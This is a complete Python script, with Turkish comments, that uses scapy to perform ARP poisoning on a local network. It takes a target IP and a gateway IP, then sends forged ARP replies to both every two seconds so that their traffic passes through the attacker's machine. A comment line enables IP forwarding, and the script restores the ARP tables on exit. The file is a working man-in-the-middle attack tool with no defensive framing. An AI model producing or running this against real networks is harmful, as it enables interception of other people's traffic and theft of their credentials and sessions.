# echo 1 > /proc/sys/net/ipv4/ip_forward

import scapy.all as scapy
import time, argparse, sys

class Arp_poison():
	
	def input(self):
		usage = "arp_poison.py [options] [-t 192.168.1.31 -g 192.168.1.1] [--target 192.168.1.31 --gateway 192.168.1.1]"
		parse_object = argparse.ArgumentParser(usage)
		parse_object.add_argument("-t","--target",dest="target_ip",help="Enter the Target IP")
		parse_object.add_argument("-g","--gateway",dest="gateway_ip",help="Enter the Gateway IP")
		args = parse_object.parse_args()
		
		if not args.target_ip or not args.gateway_ip:
			print("Eksik Parametre... \n{}".format(usage))	
			sys.exit()
		return args

	def get_mac(self,ip):
		arp_request_packet = scapy.ARP(pdst=ip) 
		broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		combined_packet = broadcast_packet/arp_request_packet # paketleri birleştirdik...
		answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
		
		return answered_list[0][1].hwsrc

	def arp_poisoning(self,target_ip,poisoned_ip):
		target_mac = self.get_mac(target_ip)
		arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip) # op=1 request, op=2 response pdst ise arp poisoning yapılacak hedef psrc ise zehirlenecek olan ip gelir 	
		scapy.send(arp_response,verbose=False)
	
	def reset_operation(self,fooled_ip,gateway_ip):
		fooled_mac = self.get_mac(fooled_ip)
		gateway_mac = self.get_mac(gateway_ip)
		
		arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac) # op=1 request, op=2
		scapy.send(arp_response, verbose=False, count=6)

arp_object = Arp_poison()
options = arp_object.input()	
try:	
	while True:
		arp_object.arp_poisoning(options.target_ip,options.gateway_ip)
		arp_object.arp_poisoning(options.gateway_ip,options.target_ip)
		
		print("\rSending packets...",end="")
		
		time.sleep(2)
except KeyboardInterrupt:
	print("\nQuit & Reset")		
	arp_object.reset_operation(options.target_ip,options.gateway_ip)
	arp_object.reset_operation(options.gateway_ip,options.target_ip)	